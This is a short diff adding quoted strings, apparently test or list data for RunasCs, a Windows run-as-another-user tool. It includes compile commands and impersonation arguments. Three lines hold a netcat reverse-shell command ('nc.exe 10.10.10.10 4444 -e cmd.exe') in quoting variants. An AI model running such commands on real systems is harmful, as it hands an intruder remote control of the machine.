@@ -1,0 +1,9 @@
+"C:\Windows\admin"" -LogonType 8 -RemoteImpersonation"
+"C:\Windows\admin"" -l 8 --remote-impersonation"
+"C:\Windows\admin"""" -l 8 --remote-impersonation "
+"C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"" -t 0"
+"C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"""
+"C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"""" -t 0"
+C:\Users folder.
+C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
